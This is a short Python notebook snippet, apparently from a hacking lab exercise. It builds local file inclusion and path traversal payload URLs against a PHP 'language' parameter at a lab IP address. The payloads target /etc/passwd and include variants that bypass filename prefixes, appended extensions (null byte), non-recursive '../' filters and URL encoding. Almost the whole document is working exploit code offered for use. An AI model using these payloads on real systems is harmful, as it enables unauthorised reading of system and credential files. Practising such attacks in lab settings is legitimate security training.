```python
#basic traversal include($_GET['language']);
#example urls http://94.237.59.199:55127/index.php?language=languages/, http://94.237.59.199:55127/index.php?language=
def basic_LFI(url,min, max, prefix, target_directory):
  output = []
  for i in range(min,max,1):
    hops = prefix*i+target_directory
    test = url+hops
    output.append(test)
  return output

output = basic_LFI("http://94.237.59.199:55127/index.php?language=languages",3,6,"../","../etc/passwd")

for o in output:
  print(o)


#file name prefix include("lang_" . $_GET['language']);
basic_LFI("http://94.237.59.199:55127/index.php?language=languages/",3,6,"../","../etc/passwd")

#appended extensions, old php versions
basic_LFI("http://94.237.59.199:55127/index.php?language=languages",3,6,"../","../etc/passwd%00")

#Non-Recursive Path Traversal Filters $language = str_replace('../', '', $_GET['language']);
basic_LFI("http://94.237.59.199:55127/index.php?language=languages",3,6,"....//","..//etc/passwd")
```

```python
#encode target directory
import urllib.parse

def basic_LFI_encode_dir(url,min, max, prefix, target_directory):
  output_encoded = []
  for i in range(min-1,max,1):
    hops = prefix*i+target_directory
    hops_encoded = urllib.parse.quote(hops, safe='') #default value of safe is /. safe='' means encode all characters
    hops_encoded = hops_encoded.replace('.', '%2E') #colab refuses to encode dots to manually adding this
    test = url+hops_encoded
    output_encoded.append(test)
  return output_encoded

output = basic_LFI_encode_dir("http://94.237.59.199:55127/index.php?language=languages",3,6,"../","../etc/passwd")

print(output)
```
